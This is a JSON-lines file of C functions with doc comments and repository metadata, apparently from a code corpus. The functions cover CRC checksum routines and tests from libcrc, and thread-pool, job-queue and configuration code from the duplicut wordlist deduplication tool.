{"docstring": "/*\n * int main( void );\n *\n * Testall is a commandline utility that tests the functionality of the libcrc\n * routines on a the current platform. The result is printed to stdout. The\n * program returns an integer value which can be catched by a shell script. The\n * value is equal to the number of errors encountered.\n */\n", "func_signal": "int main( void )", "code": "{\n\n\tint problems;\n\n\tprintf( \"\\n\" );\n\n\tproblems  = 0;\n\tproblems += test_crc( true );\n\tproblems += test_checksum_NMEA( true );\n\n\tprintf( \"\\n\" );\n\n\tif ( problems == 0 ) printf( \"**** All tests succeeded\\n\\n\" );\n\telse                 printf( \"**** A TOTAL OF %d TESTS FAILED, PLEASE CORRECT THE DETECTED PROBLEMS ****\\n\\n\", problems );\n\n\treturn problems;\n\n}", "path": "libcrc/test/testall.c", "commit_date": "2016-11-22 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint64_t crc_64_we( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_64_we() calculates in one pass the CRC64-WE 64 bit CRC\n * value for a byte string that is passed to the function together with a\n * parameter indicating the length.\n */\n", "func_signal": "uint64_t crc_64_we( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint64_t crc;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tcrc = CRC_START_64_WE;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc << 8) ^ crc_tab64[ ((crc >> 56) ^ (uint64_t) *ptr++) & 0x00000000000000FFull ];\n\t}\n\n\treturn crc ^ 0xFFFFFFFFFFFFFFFFull;\n\n}", "path": "libcrc/src/crc64.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t crc_modbus( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_modbus() calculates the 16 bits Modbus CRC in one pass for\n * a byte string of which the beginning has been passed to the function. The\n * number of bytes to check is also a parameter.\n */\n", "func_signal": "uint16_t crc_modbus( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint16_t crc;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tif ( ! crc_tab16_init ) init_crc16_tab();\n\n\tcrc = CRC_START_MODBUS;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc >> 8) ^ crc_tab16[ (crc ^ (uint16_t) *ptr++) & 0x00FF ];\n\t}\n\n\treturn crc;\n\n}", "path": "libcrc/src/crc16.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * int test_checksum_NMEA( bool verbose );\n *\n * The test_checksum_NMEA() routines performs a number of NMEA message checksum\n * tests to see if the output of the routine in the library matches expected\n * outputs. The number of mismatches is returned. Progress is printed to stdout.\n */\n", "func_signal": "int test_checksum_NMEA( bool verbose )", "code": "{\n\n\tint a, errors;\n\tunsigned char buffer[4];\n\n\terrors = 0;\n\n\tprintf( \"Testing NMEA checksum: \" );\n\n\ta = 0;\n\twhile ( checks[a].input != NULL  &&  checks[a].output != NULL ) {\n\n\t\tif ( strcmp( (char *) checksum_NMEA( (const unsigned char *) checks[a].input, buffer ), checks[a].output ) ) {\n\n\t\t\tif ( verbose ) printf( \"\\n    FAIL: \\\"%s\\\" returns \\\"%s\\\" instead of \\\"%s\\\"\", checks[a].input, buffer, checks[a].output );\n\t\t\terrors++;\n\t\t}\n\t\ta++;\n\t}\n\n\tif ( errors == 0 ) printf( \"OK\\n\" );\n\telse {\n\n\t\tif ( verbose ) printf( \"\\n    \" );\n\t\tprintf( \"FAILED %d checks\\n\", errors );\n\t}\n\n\treturn errors;\n\n}", "path": "libcrc/test/testnmea.c", "commit_date": "2016-11-22 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t crc_sick( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_sick() calculates the SICK CRC value of an input string in\n * one pass.\n */\n", "func_signal": "uint16_t crc_sick( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint16_t crc;\n\tuint16_t low_byte;\n\tuint16_t high_byte;\n\tuint16_t short_c;\n\tuint16_t short_p;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tcrc     = CRC_START_SICK;\n\tptr     = input_str;\n\tshort_p = 0;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tshort_c = 0x00FF & (uint16_t) *ptr;\n\n\t\tif ( crc & 0x8000 ) crc = ( crc << 1 ) ^ CRC_POLY_SICK;\n\t\telse                crc =   crc << 1;\n\n\t\tcrc    ^= ( short_c | short_p );\n\t\tshort_p = short_c << 8;\n\n\t\tptr++;\n\t}\n\n\tlow_byte  = (crc & 0xFF00) >> 8;\n\thigh_byte = (crc & 0x00FF) << 8;\n\tcrc       = low_byte | high_byte;\n\n\treturn crc;\n\n}", "path": "libcrc/src/crcsick.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * static int generate_table( const char *typename, const char *filename );\n *\n * The function generate_table() generates a CRC lookup table of a specified\n * type and stores the generated output in a file. If the function succeeds the\n * value 0 is returned. Another value is an indication of failure and that\n * value is used as the exit value of the program.\n */\n", "func_signal": "static int generate_table( const char *typename, const char *filename )", "code": "{\n\n\tint a;\n\tint type;\n\tint bits;\n\tFILE *fp;\n\tconst char *tabname;\n\n\tif ( typename == NULL  ||  filename == NULL ) {\n\n\t\tfprintf( stderr, \"\\nprecalc: Internal pointer error\\n\\n\" );\n\t\treturn 2;\n\t}\n\n\tif      ( ! strcmp( typename, \"--crc64\" ) ) type = TYPE_CRC64;\n\telse if ( ! strcmp( typename, \"--crc32\" ) ) type = TYPE_CRC32;\n\telse {\n\n\t\tfprintf( stderr, \"\\nprecalc: Unknown table type \\\"%s\\\" passed\\n\\n\", typename );\n\t\treturn 3;\n\t}\n\n\ttabname = NULL;\n\tbits    = 1;\n\n\tswitch ( type ) {\n\n\t\tcase TYPE_CRC32 : init_crc32_tab(); tabname = \"crc_tab32\"; bits = 32; break;\n\t\tcase TYPE_CRC64 : init_crc64_tab(); tabname = \"crc_tab64\"; bits = 64; break;\n\t}\n\n#if defined(_MSC_VER)\n\tfp = NULL;\n\tfopen_s( &fp, filename, \"w\" );\n#else\n\tfp = fopen( filename, \"w\" );\n#endif\n\tif ( fp == NULL ) {\n\n\t\tfprintf( stderr, \"\\nprecalc: cannot open \\\"%s\\\" for writing\\n\\n\", filename );\n\t\treturn 0;\n\t}\n\n\tfprintf( fp, \"/*\\n\" );\n\tfprintf( fp, \" * Library: libcrc\\n\" );\n\tfprintf( fp, \" * File:    %s\\n\", filename );\n\tfprintf( fp, \" * Author:  Auto generated by the precalc program\\n\" );\n\tfprintf( fp, \" *\\n\" );\n\tfprintf( fp, \" * PLEASE DO NOT CHANGE THIS FILE!\\n\" );\n\tfprintf( fp, \" * ===============================\\n\" );\n\tfprintf( fp, \" * This file was automatically generated and will be overwritten whenever the\\n\" );\n\tfprintf( fp, \" * library is recompiled. All manually added changes will be lost in that case.\\n\" );\n\tfprintf( fp, \" */\\n\\n\" );\n\n\tfprintf( fp, \"const uint%d_t %s[256] = {\\n\", bits, tabname );\n\n\tfor (a=0; a<256; a++) {\n\n\t\tswitch ( bits ) {\n\n\t\t\tcase  8 : fprintf( fp, \"\\t0x%02\"  PRIX8  \"\\x75\",   (uint8_t)  (crc_tab_precalc[a] & 0x00000000000000FFull) ); break;\n\t\t\tcase 16 : fprintf( fp, \"\\t0x%04\"  PRIX16 \"\\x75\",   (uint16_t) (crc_tab_precalc[a] & 0x000000000000FFFFull) ); break;\n\t\t\tcase 32 : fprintf( fp, \"\\t0x%08\"  PRIX32 \"\\x75l\",  (uint32_t) (crc_tab_precalc[a] & 0x00000000FFFFFFFFull) ); break;\n\t\t\tcase 64 : fprintf( fp, \"\\t0x%016\" PRIX64 \"\\x75ll\",             crc_tab_precalc[a]                          ); break;\n\t\t}\n\t\tif ( a < 255 ) fprintf( fp, \",\\n\" );\n\t\telse           fprintf( fp, \"\\n\" );\n\t}\n\n\tfprintf( fp, \"};\\n\\n\" );\n\n\tfclose( fp );\n\n\treturn 0;\n\n}", "path": "libcrc/precalc/precalc.c", "commit_date": "2016-11-14 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * static void init_crc_tab( void );\n *\n * For optimal performance, the  CRC Kermit routine uses a lookup table with\n * values that can be used directly in the XOR arithmetic in the algorithm.\n * This lookup table is calculated by the init_crc_tab() routine, the first\n * time the CRC function is called.\n */\n", "func_signal": "static void init_crc_tab( void )", "code": "{\n\n\tuint16_t i;\n\tuint16_t j;\n\tuint16_t crc;\n\tuint16_t c;\n\n\tfor (i=0; i<256; i++) {\n\n\t\tcrc = 0;\n\t\tc   = i;\n\n\t\tfor (j=0; j<8; j++) {\n\n\t\t\tif ( (crc ^ c) & 0x0001 ) crc = ( crc >> 1 ) ^ CRC_POLY_KERMIT;\n\t\t\telse                      crc =   crc >> 1;\n\n\t\t\tc = c >> 1;\n\t\t}\n\n\t\tcrc_tab[i] = crc;\n\t}\n\n\tcrc_tab_init = true;\n\n}", "path": "libcrc/src/crckrmit.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t update_crc_16( uint16_t crc, unsigned char c );\n *\n * The function update_crc_16() calculates a new CRC-16 value based on the\n * previous value of the CRC and the next byte of data to be checked.\n */\n", "func_signal": "uint16_t update_crc_16( uint16_t crc, unsigned char c )", "code": "{\n\n\tif ( ! crc_tab16_init ) init_crc16_tab();\n\n\treturn (crc >> 8) ^ crc_tab16[ (crc ^ (uint16_t) c) & 0x00FF ];\n\n}", "path": "libcrc/src/crc16.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t crc_16( const unsigned char *input_str, size_t num_bytes );\n *\n * The function crc_16() calculates the 16 bits CRC16 in one pass for a byte\n * string of which the beginning has been passed to the function. The number of\n * bytes to check is also a parameter. The number of the bytes in the string is\n * limited by the constant SIZE_MAX.\n */\n", "func_signal": "uint16_t crc_16( const unsigned char *input_str, size_t num_bytes )", "code": "{\n\n\tuint16_t crc;\n\tconst unsigned char *ptr;\n\tsize_t a;\n\n\tif ( ! crc_tab16_init ) init_crc16_tab();\n\n\tcrc = CRC_START_16;\n\tptr = input_str;\n\n\tif ( ptr != NULL ) for (a=0; a<num_bytes; a++) {\n\n\t\tcrc = (crc >> 8) ^ crc_tab16[ (crc ^ (uint16_t) *ptr++) & 0x00FF ];\n\t}\n\n\treturn crc;\n\n}", "path": "libcrc/src/crc16.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * uint16_t update_crc_sick( uint16_t crc, unsigned char c, unsigned char prev_byte );\n *\n * The function update_crc_sick() calculates a new CRC-SICK value based on the\n * previous value of the CRC and the next byte of the data to be checked.\n */\n", "func_signal": "uint16_t update_crc_sick( uint16_t crc, unsigned char c, unsigned char prev_byte )", "code": "{\n\n\tuint16_t short_c;\n\tuint16_t short_p;\n\n\tshort_c  =   0x00FF & (uint16_t) c;\n\tshort_p  = ( 0x00FF & (uint16_t) prev_byte ) << 8;\n\n\tif ( crc & 0x8000 ) crc = ( crc << 1 ) ^ CRC_POLY_SICK;\n\telse                crc =   crc << 1;\n\n\tcrc ^= ( short_c | short_p );\n\n\treturn crc;\n\n}", "path": "libcrc/src/crcsick.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * static void init_crcdnp_tab( void );\n *\n * For better performance, the DNP CRC calculation uses a precompiled list with\n * bit patterns that are used in the XOR operation in the main routine. This\n * table is calculated once at the start of the program by the\n * init_crcdnp_tab() routine.\n */\n", "func_signal": "static void init_crcdnp_tab( void )", "code": "{\n\n\tint i;\n\tint j;\n\tuint16_t crc;\n\tuint16_t c;\n\n\tfor (i=0; i<256; i++) {\n\n\t\tcrc = 0;\n\t\tc   = (uint16_t) i;\n\n\t\tfor (j=0; j<8; j++) {\n\n\t\t\tif ( (crc ^ c) & 0x0001 ) crc = ( crc >> 1 ) ^ CRC_POLY_DNP;\n\t\t\telse                      crc =   crc >> 1;\n\n\t\t\tc = c >> 1;\n\t\t}\n\n\t\tcrc_tabdnp[i] = crc;\n\t}\n\n\tcrc_tabdnp_init = true;\n\n}", "path": "libcrc/src/crcdnp.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/*\n * void init_crc64_tab( void );\n *\n * For optimal speed, the CRC64 calculation uses a table with pre-calculated\n * bit patterns which are used in the XOR operations in the program. This table\n * is generated during compilation of the library and added to the library as a\n * table with constant values.\n */\n", "func_signal": "void init_crc64_tab( void )", "code": "{\n\n\tuint64_t i;\n\tuint64_t j;\n\tuint64_t c;\n\tuint64_t crc;\n\n\tfor (i=0; i<256; i++) {\n\n\t\tcrc = 0;\n\t\tc   = i << 56;\n\n\t\tfor (j=0; j<8; j++) {\n\n\t\t\tif ( ( crc ^ c ) & 0x8000000000000000ull ) crc = ( crc << 1 ) ^ CRC_POLY_64;\n\t\t\telse                                       crc =   crc << 1;\n\n\t\t\tc = c << 1;\n\t\t}\n\n\t\tcrc_tab_precalc[i] = crc;\n\t}\n\n}", "path": "libcrc/precalc/crc64_table.c", "commit_date": "2016-12-04 00:00:00", "repo_name": "lammertb/libcrc", "stars": 539, "license": "mit", "language": "c", "size": 91}
{"docstring": "/* What each thread is doing\n*\n* In principle this is an endless loop. The only time this loop gets interuppted is once\n* thpool_destroy() is invoked or the program exits.\n*\n* @param  thread        thread that will run this function\n* @return nothing\n*/\n", "func_signal": "static void* thread_do(struct thread* thread_p)", "code": "{\n\n\t/* Set thread name for profiling and debuging */\n\tchar thread_name[128] = {0};\n\tsprintf(thread_name, \"thread-pool-%d\", thread_p->id);\n\n#if defined(__linux__)\n\t/* Use prctl instead to prevent using _GNU_SOURCE flag and implicit declaration */\n\tprctl(PR_SET_NAME, thread_name);\n#elif defined(__APPLE__) && defined(__MACH__)\n\tpthread_setname_np(thread_name);\n#else\n\terr(\"thread_do(): pthread_setname_np is not supported on this system\");\n#endif\n\n\t/* Assure all threads have been created before starting serving */\n\tthpool_* thpool_p = thread_p->thpool_p;\n\n\t/* Register signal handler */\n\tstruct sigaction act;\n\tsigemptyset(&act.sa_mask);\n\tact.sa_flags = 0;\n\tact.sa_handler = thread_hold;\n\tif (sigaction(SIGUSR1, &act, NULL) == -1) {\n\t\terr(\"thread_do(): cannot handle SIGUSR1\");\n\t}\n\n\t/* Mark thread as alive (initialized) */\n\tpthread_mutex_lock(&thpool_p->thcount_lock);\n\tthpool_p->num_threads_alive += 1;\n\tpthread_mutex_unlock(&thpool_p->thcount_lock);\n\n\twhile(threads_keepalive){\n\n\t\tbsem_wait(thpool_p->jobqueue.has_jobs);\n\n\t\tif (threads_keepalive){\n\n\t\t\tpthread_mutex_lock(&thpool_p->thcount_lock);\n\t\t\tthpool_p->num_threads_working++;\n\t\t\tpthread_mutex_unlock(&thpool_p->thcount_lock);\n\n\t\t\t/* Read job from queue and execute it */\n\t\t\tvoid (*func_buff)(void*);\n\t\t\tvoid*  arg_buff;\n\t\t\tjob* job_p = jobqueue_pull(&thpool_p->jobqueue);\n\t\t\tif (job_p) {\n\t\t\t\tfunc_buff = job_p->function;\n\t\t\t\targ_buff  = job_p->arg;\n\t\t\t\tfunc_buff(arg_buff);\n\t\t\t\tfree(job_p);\n\t\t\t}\n\n\t\t\tpthread_mutex_lock(&thpool_p->thcount_lock);\n\t\t\tthpool_p->num_threads_working--;\n\t\t\tif (!thpool_p->num_threads_working) {\n\t\t\t\tpthread_cond_signal(&thpool_p->threads_all_idle);\n\t\t\t}\n\t\t\tpthread_mutex_unlock(&thpool_p->thcount_lock);\n\n\t\t}\n\t}\n\tpthread_mutex_lock(&thpool_p->thcount_lock);\n\tthpool_p->num_threads_alive --;\n\tpthread_mutex_unlock(&thpool_p->thcount_lock);\n\n\treturn NULL;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Get first job from queue(removes it from queue)\n * Notice: Caller MUST hold a mutex\n */\n", "func_signal": "static struct job* jobqueue_pull(jobqueue* jobqueue_p)", "code": "{\n\n\tpthread_mutex_lock(&jobqueue_p->rwmutex);\n\tjob* job_p = jobqueue_p->front;\n\n\tswitch(jobqueue_p->len){\n\n\t\tcase 0:  /* if no jobs in queue */\n\t\t  \t\t\tbreak;\n\n\t\tcase 1:  /* if one job in queue */\n\t\t\t\t\tjobqueue_p->front = NULL;\n\t\t\t\t\tjobqueue_p->rear  = NULL;\n\t\t\t\t\tjobqueue_p->len = 0;\n\t\t\t\t\tbreak;\n\n\t\tdefault: /* if >1 jobs in queue */\n\t\t\t\t\tjobqueue_p->front = job_p->prev;\n\t\t\t\t\tjobqueue_p->len--;\n\t\t\t\t\t/* more than one job in queue -> post it */\n\t\t\t\t\tbsem_post(jobqueue_p->has_jobs);\n\n\t}\n\n\tpthread_mutex_unlock(&jobqueue_p->rwmutex);\n\treturn job_p;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Add work to the thread pool */\n", "func_signal": "int thpool_add_work(thpool_* thpool_p, void (*function_p)(void*), void* arg_p)", "code": "{\n\tjob* newjob;\n\n\tnewjob=(struct job*)malloc(sizeof(struct job));\n\tif (newjob==NULL){\n\t\terr(\"thpool_add_work(): Could not allocate memory for new job\\n\");\n\t\treturn -1;\n\t}\n\n\t/* add function and argument */\n\tnewjob->function=function_p;\n\tnewjob->arg=arg_p;\n\n\t/* add job to queue */\n\tjobqueue_push(&thpool_p->jobqueue, newjob);\n\n\treturn 0;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Initialise thread pool */\n", "func_signal": "struct thpool_* thpool_init(int num_threads)", "code": "{\n\n\tthreads_on_hold   = 0;\n\tthreads_keepalive = 1;\n\n\tif (num_threads < 0){\n\t\tnum_threads = 0;\n\t}\n\n\t/* Make new thread pool */\n\tthpool_* thpool_p;\n\tthpool_p = (struct thpool_*)malloc(sizeof(struct thpool_));\n\tif (thpool_p == NULL){\n\t\terr(\"thpool_init(): Could not allocate memory for thread pool\\n\");\n\t\treturn NULL;\n\t}\n\tthpool_p->num_threads_alive   = 0;\n\tthpool_p->num_threads_working = 0;\n\n\t/* Initialise the job queue */\n\tif (jobqueue_init(&thpool_p->jobqueue) == -1){\n\t\terr(\"thpool_init(): Could not allocate memory for job queue\\n\");\n\t\tfree(thpool_p);\n\t\treturn NULL;\n\t}\n\n\t/* Make threads in pool */\n\tthpool_p->threads = (struct thread**)malloc(num_threads * sizeof(struct thread *));\n\tif (thpool_p->threads == NULL){\n\t\terr(\"thpool_init(): Could not allocate memory for threads\\n\");\n\t\tjobqueue_destroy(&thpool_p->jobqueue);\n\t\tfree(thpool_p);\n\t\treturn NULL;\n\t}\n\n\tpthread_mutex_init(&(thpool_p->thcount_lock), NULL);\n\tpthread_cond_init(&thpool_p->threads_all_idle, NULL);\n\n\t/* Thread init */\n\tint n;\n\tfor (n=0; n<num_threads; n++){\n\t\tthread_init(thpool_p, &thpool_p->threads[n], n);\n#if THPOOL_DEBUG\n\t\t\tprintf(\"THPOOL_DEBUG: Created thread %d in pool \\n\", n);\n#endif\n\t}\n\n\t/* Wait for threads to initialize */\n\twhile (thpool_p->num_threads_alive != num_threads) {}\n\n\treturn thpool_p;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Destroy the threadpool */\n", "func_signal": "void thpool_destroy(thpool_* thpool_p)", "code": "{\n\t/* No need to destory if it's NULL */\n\tif (thpool_p == NULL) return ;\n\n\tvolatile int threads_total = thpool_p->num_threads_alive;\n\n\t/* End each thread 's infinite loop */\n\tthreads_keepalive = 0;\n\n\t/* Give one second to kill idle threads */\n\tdouble TIMEOUT = 1.0;\n\ttime_t start, end;\n\tdouble tpassed = 0.0;\n\ttime (&start);\n\twhile (tpassed < TIMEOUT && thpool_p->num_threads_alive){\n\t\tbsem_post_all(thpool_p->jobqueue.has_jobs);\n\t\ttime (&end);\n\t\ttpassed = difftime(end,start);\n\t}\n\n\t/* Poll remaining threads */\n\twhile (thpool_p->num_threads_alive){\n\t\tbsem_post_all(thpool_p->jobqueue.has_jobs);\n\t\tsleep(1);\n\t}\n\n\t/* Job queue cleanup */\n\tjobqueue_destroy(&thpool_p->jobqueue);\n\t/* Deallocs */\n\tint n;\n\tfor (n=0; n < threads_total; n++){\n\t\tthread_destroy(thpool_p->threads[n]);\n\t}\n\tfree(thpool_p->threads);\n\tfree(thpool_p);\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/** Get biggest prime number `p` as `p` <= `n`.\n * Used to settle `hmap` size with a prime number value,\n * ensuring an optimal hash repartition among the table.\n */\n", "func_signal": "static long     get_prev_prime(long n)", "code": "{\n    int         i;\n\n    n = (n - 1) | 1;\n    while (n > 0)\n    {\n        i = 3;\n        while (i && i <= sqrt(n))\n        {\n            if (n % i == 0)\n                i = 0;\n            else\n                i += 2;\n        }\n        if (i)\n            return (n);\n        n -= 2;\n    }\n    return (n);\n}", "path": "duplicut/src/config.c", "commit_date": "2020-10-11 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/** Configuration --> g_conf.hmap_size\n * Use `file` size and `memstate` to determine optimal size for `hmap`.\n */\n", "func_signal": "static void     config_hmap_size(struct file *file, struct memstate *memstate)", "code": "{\n    double      max_size;\n    double      hmap_size;\n\n    hmap_size = (double)file->info.st_size;\n    hmap_size /= HMAP_LOAD_FACTOR * MEDIUM_LINE_BYTES;\n    if (hmap_size < 10000.0)\n        hmap_size = 10000.0;\n\n    max_size = memstate->mem_available * HMAP_MAX_SIZE;\n    max_size /= sizeof(t_line);\n    if (hmap_size > max_size)\n        hmap_size = max_size;\n\n    g_conf.hmap_size = (size_t) get_prev_prime((long)hmap_size);\n}", "path": "duplicut/src/config.c", "commit_date": "2020-10-11 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Post to all threads */\n", "func_signal": "static void bsem_post_all(bsem *bsem_p)", "code": "{\n\tpthread_mutex_lock(&bsem_p->mutex);\n\tbsem_p->v = 1;\n\tpthread_cond_broadcast(&bsem_p->cond);\n\tpthread_mutex_unlock(&bsem_p->mutex);\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Resume all threads in threadpool */\n", "func_signal": "void thpool_resume(thpool_* thpool_p)", "code": "{\n    // resuming a single threadpool hasn't been\n    // implemented yet, meanwhile this supresses\n    // the warnings\n    (void)thpool_p;\n\n\tthreads_on_hold = 0;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Add (allocated) job to queue\n */\n", "func_signal": "static void jobqueue_push(jobqueue* jobqueue_p, struct job* newjob)", "code": "{\n\n\tpthread_mutex_lock(&jobqueue_p->rwmutex);\n\tnewjob->prev = NULL;\n\n\tswitch(jobqueue_p->len){\n\n\t\tcase 0:  /* if no jobs in queue */\n\t\t\t\t\tjobqueue_p->front = newjob;\n\t\t\t\t\tjobqueue_p->rear  = newjob;\n\t\t\t\t\tbreak;\n\n\t\tdefault: /* if jobs in queue */\n\t\t\t\t\tjobqueue_p->rear->prev = newjob;\n\t\t\t\t\tjobqueue_p->rear = newjob;\n\n\t}\n\tjobqueue_p->len++;\n\n\tbsem_post(jobqueue_p->has_jobs);\n\tpthread_mutex_unlock(&jobqueue_p->rwmutex);\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Free all queue resources back to the system */\n", "func_signal": "static void jobqueue_destroy(jobqueue* jobqueue_p)", "code": "{\n\tjobqueue_clear(jobqueue_p);\n\tfree(jobqueue_p->has_jobs);\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Clear the queue */\n", "func_signal": "static void jobqueue_clear(jobqueue* jobqueue_p)", "code": "{\n\n\twhile(jobqueue_p->len){\n\t\tfree(jobqueue_pull(jobqueue_p));\n\t}\n\n\tjobqueue_p->front = NULL;\n\tjobqueue_p->rear  = NULL;\n\tbsem_reset(jobqueue_p->has_jobs);\n\tjobqueue_p->len = 0;\n\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/** thread worker\n * print progression status with print_status() on keypress\n */\n", "func_signal": "static void *watch_user_input_worker(void *arg)", "code": "{\n    char        input[BUF_SIZE];\n\n    (void)arg;\n    while (1)\n    {\n#if DEBUG_PROGRAM_STATUS == 0\n        memset(input, 0, BUF_SIZE);\n# pragma GCC diagnostic push // no need to check read()'s return here\n# pragma GCC diagnostic ignored \"-Wunused-result\"\n        read(STDIN_FILENO, input, BUF_SIZE - 1);\n# pragma GCC diagnostic pop\n#else\n        usleep(100000);\n#endif\n        display_status();\n    }\n    return NULL;\n}", "path": "duplicut/src/uinput.c", "commit_date": "2020-10-11 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Pause all threads in threadpool */\n", "func_signal": "void thpool_pause(thpool_* thpool_p)", "code": "{\n\tint n;\n\tfor (n=0; n < thpool_p->num_threads_alive; n++){\n\t\tpthread_kill(thpool_p->threads[n]->pthread, SIGUSR1);\n\t}\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/** Configuration --> g_conf.threads\n * Determine the number of worker threads to use.\n */\n", "func_signal": "static void     config_threads(void)", "code": "{\n    long        max_threads;\n\n    max_threads = sysconf(_SC_NPROCESSORS_ONLN);\n    if (max_threads < 0)\n        error(\"sysconf(_SC_NPROCESSORS_ONLN): %s\", ERRNO);\n    else if (max_threads == 0)\n        die(\"sysconf(_SC_NPROCESSORS_ONLN): Unexpected return: 0\");\n\n    if (g_conf.threads == 0)\n        g_conf.threads = (unsigned int) max_threads;\n    else if (g_conf.threads > (unsigned int) max_threads)\n        error(\"cannot use more than %ld threads\", max_threads);\n}", "path": "duplicut/src/config.c", "commit_date": "2020-10-11 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Initialize a thread in the thread pool\n *\n * @param thread        address to the pointer of the thread to be created\n * @param id            id to be given to the thread\n * @return 0 on success, -1 otherwise.\n */\n", "func_signal": "static int thread_init (thpool_* thpool_p, struct thread** thread_p, int id)", "code": "{\n\n\t*thread_p = (struct thread*)malloc(sizeof(struct thread));\n\tif (*thread_p == NULL){\n\t\terr(\"thread_init(): Could not allocate memory for thread\\n\");\n\t\treturn -1;\n\t}\n\n\t(*thread_p)->thpool_p = thpool_p;\n\t(*thread_p)->id       = id;\n\n\tpthread_create(&(*thread_p)->pthread, NULL, (void * (*)(void *)) thread_do, (*thread_p));\n\tpthread_detach((*thread_p)->pthread);\n\treturn 0;\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
{"docstring": "/* Sets the calling thread on hold */\n", "func_signal": "static void thread_hold(int sig_id)", "code": "{\n    (void)sig_id;\n\tthreads_on_hold = 1;\n\twhile (threads_on_hold){\n\t\tsleep(1);\n\t}\n}", "path": "duplicut/src/thpool.c", "commit_date": "2020-09-08 00:00:00", "repo_name": "nil0x42/duplicut", "stars": 774, "license": "gpl-3.0", "language": "c", "size": 1168}
